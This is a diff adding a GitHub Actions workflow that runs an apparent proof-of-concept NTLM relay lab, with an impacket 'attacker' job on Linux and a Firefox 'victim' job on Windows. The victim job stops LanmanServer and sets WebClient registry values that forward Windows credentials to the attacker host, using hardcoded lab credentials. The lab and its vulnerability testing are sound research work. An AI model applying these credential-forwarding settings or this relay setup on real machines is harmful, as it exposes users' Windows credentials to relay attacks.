@@ -1,0 +1,208 @@
+name: Firefox reparse NTLM relay lab
+
+on:
+  push:
+    branches: [runner-probe-20260910]
+    paths:
+      - .github/workflows/firefox-ntlm-relay-lab.yml
+  workflow_dispatch:
+
+permissions:
+  contents: write
+  actions: read
+
+concurrency:
+  group: firefox-relay-lab-${{ github.run_id }}
+  cancel-in-progress: false
+
+env:
+  LAB_BRANCH: runner-probe-20260910
+  LAB_DOMAIN: LAB
+  LAB_USERNAME: victim
+  LAB_PASSWORD: FfRelayLab-Only-2026!
+  LAB_NONCE: ${{ github.run_id }}
+
+jobs:
+  attacker:
+    runs-on: ubuntu-latest
+    timeout-minutes: 32
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: runner-probe-20260910
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Install relay lab dependencies
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq openssh-client
+          python -m pip install --disable-pip-version-check impacket pyspnego requests
+
+      - name: Run isolated relay endpoint and controlled authenticated target
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          LAB_ATTACKER_OUT: ${{ github.workspace }}/attacker-out
+        run: |
+          mkdir -p attacker-out
+          PYTHONUNBUFFERED=1 python firefox-relay-lab/attacker.py | tee attacker-out/attacker-console.txt
+
+      - name: Upload attacker evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: relay-attacker-${{ github.run_id }}
+          path: attacker-out
+          if-no-files-found: warn
+          retention-days: 1
+
+  victim:
+    runs-on: windows-latest
+    timeout-minutes: 32
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: runner-probe-20260910
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+
+      - name: Set up latest Firefox
+        id: setup-firefox
+        uses: browser-actions/setup-firefox@v1
+        with:
+          firefox-version: latest
+
+      - name: Set up geckodriver
+        uses: browser-actions/setup-geckodriver@latest
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Install victim lab dependencies
+        shell: pwsh
+        run: |
+          python -m pip install --disable-pip-version-check selenium pywinauto psutil requests
+
+      - name: Wait for attacker tunnel coordination
+        shell: pwsh
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          New-Item -ItemType Directory -Force victim-out | Out-Null
+          python firefox-relay-lab/wait_coordination.py victim-out/coordination.json
+          $env:FIREFOX_FOR_CONFIG = "${{ steps.setup-firefox.outputs.firefox-path }}"
+          @'
+          import json, os
+          from pathlib import Path
+          p=Path('victim-out/coordination.json')
+          d=json.loads(p.read_text())
+          d['firefox_binary']=os.environ['FIREFOX_FOR_CONFIG']
+          d['network_identity']='LAB\\victim'
+          d['victim_out']=str(Path('victim-out').resolve())
+          p.write_text(json.dumps(d,indent=2))
+          '@ | Set-Content -Encoding UTF8 victim-out/finalize-config.py
+          python victim-out/finalize-config.py
+
+      - name: Configure ephemeral Windows network redirectors
+        shell: pwsh
+        run: |
+          $state = [ordered]@{}
+          try {
+            Stop-Service LanmanServer -Force -ErrorAction Stop
+            $state.lanmanServerStopped = $true
+          } catch {
+            $state.lanmanServerStopped = $false
+            $state.lanmanServerError = $_.Exception.Message
+          }
+          try {
+            if (Get-Command Install-WindowsFeature -ErrorAction SilentlyContinue) {
+              $feature = Install-WindowsFeature WebDAV-Redirector -ErrorAction Continue
+              $state.webDavFeature = $feature.ExitCode.ToString()
+            }
+          } catch {
+            $state.webDavFeatureError = $_.Exception.Message
+          }
+          $coord = Get-Content victim-out/coordination.json | ConvertFrom-Json
+          $server = $coord.http.host
+          $port = $coord.http.port
+          $webClientPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\WebClient\Parameters'
+          try {
+            New-Item -Path $webClientPath -Force | Out-Null
+            New-ItemProperty -Path $webClientPath -Name BasicAuthLevel -PropertyType DWord -Value 2 -Force | Out-Null
+            New-ItemProperty -Path $webClientPath -Name AuthForwardServerList -PropertyType MultiString -Value @("http://${server}:${port}/*", "http://${server}:${port}") -Force | Out-Null
+            Set-Service WebClient -StartupType Manual -ErrorAction Stop
+            Start-Service WebClient -ErrorAction Stop
+            $state.webClient = (Get-Service WebClient).Status.ToString()
+          } catch {
+            $state.webClientError = $_.Exception.Message
+          }
+          $state | ConvertTo-Json -Depth 8 | Set-Content -Encoding UTF8 victim-out/windows-network-state.json
+
+      - name: Run Firefox under isolated network-only lab identity
+        shell: pwsh
+        run: |
+          $python = (Get-Command python).Source
+          $script = (Resolve-Path firefox-relay-lab/victim.py).Path
+          $config = (Resolve-Path victim-out/coordination.json).Path
+          $out = (Resolve-Path victim-out).Path
+          & firefox-relay-lab/launch_netonly.ps1 -Python $python -Script $script -Config $config -OutputDirectory $out
+
+      - name: Upload victim evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: relay-victim-${{ github.run_id }}
+          path: victim-out
+          if-no-files-found: warn
+          retention-days: 1
+
+  adjudicate:
+    if: always()
+    needs: [attacker, victim]
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: runner-probe-20260910
+          fetch-depth: 0
+
+      - uses: actions/download-artifact@v4
+        with:
+          pattern: relay-*-${{ github.run_id }}
+          path: downloaded-artifacts
+          merge-multiple: false
+
+      - name: Strictly adjudicate the end-to-end evidence
+        run: |
+          mkdir -p adjudication
+          python firefox-relay-lab/adjudicate.py downloaded-artifacts adjudication | tee adjudication/console.txt
+
+      - name: Publish sanitized machine verdict
+        shell: bash
+        run: |
+          mkdir -p ".proof-results/relay-lab-${{ github.run_id }}"
+          cp adjudication/adjudication.json adjudication/adjudication.md ".proof-results/relay-lab-${{ github.run_id }}/"
+          if compgen -G "adjudication/CONFIRMED_9_6_*.json" > /dev/null; then
+            cp adjudication/CONFIRMED_9_6_*.json .proof-results/CONFIRMED_9_6.json
+          fi
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add .proof-results
+          git commit -m "Publish Firefox relay lab verdict ${{ github.run_id }}" || exit 0
+          for n in 1 2 3 4 5; do
+            git pull --rebase origin runner-probe-20260910 && git push origin HEAD:runner-probe-20260910 && break
+            sleep $((n * 2))
+          done
+
+      - name: Upload adjudicated evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: relay-adjudication-${{ github.run_id }}
+          path: adjudication
+          if-no-files-found: warn
+          retention-days: 1
